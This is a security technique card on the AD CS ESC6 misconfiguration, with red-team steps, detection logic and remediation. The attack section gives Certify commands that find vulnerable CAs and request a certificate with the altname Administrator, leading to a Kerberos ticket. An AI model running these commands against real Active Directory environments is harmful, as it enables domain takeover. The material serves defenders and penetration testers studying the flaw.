# [PE-ELEVATE-002]: Alternative Subject Alternative Names (SANs) - ESC6

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-002 |
| **MITRE ATT&CK v18.1** | [Abuse Elevation Control Mechanism (T1548)](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows AD / AD CS |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This is a variant of certificate abuse where the Certificate Authority (CA) itself is misconfigured with the flag `EDITF_ATTRIBUTESUBJECTALTNAME2`. When this flag is set on the CA, *any* certificate request (even for templates that don't explicitly allow SANs) can include a user-defined Subject Alternative Name. This global setting overrides template security, allowing users to mint certificates for any user (e.g., Administrator) using *any* valid template (e.g., "User").
- **Attack Surface:** AD CS CA Configuration.
- **Business Impact:** **Domain Compromise**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Any Authenticated User.
- **Tools:**
    - [Certify](https://github.com/GhostPack/Certify)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check CA Config**
```cmd
Certify.exe find /vulnerable
# Look for "EDITF_ATTRIBUTESUBJECTALTNAME2"
```

**Step 2: Request Cert (Any Template)**
Use a standard "User" template but inject the SAN.
```cmd
Certify.exe request /ca:CA01.corp.local\CorpCA /template:User /altname:Administrator
```

**Step 3: Authenticate**
Use Rubeus to get a TGT.

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **CertificationAuthority** | 4886 | Look for requests where `Attributes` contains `SAN:` or `SubjectAltName`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Disable Flag:** Run the following command on the CA to disable this dangerous setting:
    ```cmd
    certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
    net stop certsvc & net start certsvc
    ```

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-002]
> **Next Logical Step:** [CA-UNSC-001]
